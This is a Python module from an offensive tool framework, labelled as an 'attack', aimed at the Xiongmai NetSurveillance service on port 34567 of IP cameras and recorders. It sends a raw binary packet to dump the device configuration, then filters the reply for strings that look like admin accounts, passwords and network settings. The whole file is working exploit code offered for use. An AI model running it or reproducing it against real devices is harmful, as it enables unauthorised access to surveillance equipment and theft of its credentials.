import asyncio
import re
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "xiongmai/netsurveillance_attack"
        self.description = "Exploit engine to extract raw system configuration strings via Xiongmai NetSurveillance service (Port 34567)."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "34567"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = int(self.options["PORT"]["value"])
        
        # Paquet binaire de requête de configuration globale (SysManager Dump command)
        # Structure du protocole propriétaire Xiongmai/NetSurveillance
        packet = b"\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00"
        
        try:
            print(f"\033[1;33m[*] Opening raw socket stream to Xiongmai service on port {port}...\033[0m")
            reader, writer = await asyncio.open_connection(target, port)
            
            print("\033[1;33m[*] Sending raw binary configuration disclosure payload...\033[0m")
            writer.write(packet)
            await writer.drain()
            
            # Lecture d'un bloc de données plus large car la configuration renvoyée peut être massive
            data = await asyncio.wait_for(reader.read(4096), timeout=8.0)
            writer.close()
            await writer.wait_closed()
            
            if len(data) > 0:
                # Extraction des chaînes ASCII/UTF-8 lisibles du paquet binaire (Regex de filtrage type string)
                extracted_strings = re.findall(rb'[a-zA-Z0-9_\-\.\:\@]{3,}', data)
                
                # Conversion en texte lisible pour l'enquêteur
                cleaned_strings = [s.decode('utf-8', errors='ignore') for s in extracted_strings]
                
                # Filtrage rapide des mots-clés d'intérêt (comptes, mots de passe, configurations)
                interesting_data = [s for s in cleaned_strings if any(k in s.lower() for k in ["admin", "pass", "user", "net", "dhcp", "dns"])]
                
                if interesting_data:
                    preview = " || ".join(interesting_data[:15])
                    return {
                        "success": True,
                        "details": f"Configuration data leaked! Extracted parameter strings preview:\n  -> {preview}"
                    }
                else:
                    return {
                        "success": True,
                        "details": f"Binary dump successful, but no cleartext text matched standard patterns. Raw response length: {len(data)} bytes."
                    }
                    
        except Exception as e:
            return {"success": False, "error": str(e)}
            
        return {"success": False, "details": "The target Xiongmai service did not return an operational configuration data payload."}
